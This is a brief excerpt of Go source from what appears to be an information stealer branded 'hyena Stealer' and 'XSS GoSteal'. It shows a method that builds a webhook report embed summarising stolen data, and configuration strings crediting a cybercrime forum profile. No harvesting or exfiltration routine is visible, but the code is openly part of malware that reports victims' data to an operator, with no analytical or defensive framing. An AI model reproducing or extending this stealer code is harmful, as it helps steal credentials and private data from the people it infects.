...
func (stealer *Stealer) SendOverview() {
	...
	overviewEmbed := Embed{
		Title:     "hyena Stealer <:go:1058487887148109864>",
		Color:     embedColor,
		Url:       xssUrl,
		Timestamp: time.Now(),
		Fields: []Field{
...
var (
	webhookName = "XSS GoSteal"
	footerText  = "Made with ❤️ for XSS"
	xssUrl      = "https://xss.is/members/326294/"
	embedImage  = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/Iglesia_de_Santo_Ant%C3%B3nio_en_R%C3%ADo_de_Janeiro%2C_Brasil.jpg/800px-Iglesia_de_Santo_Ant%C3%B3nio_en_R%C3%ADo_de_Janeiro%2C_Brasil.jpg"
)
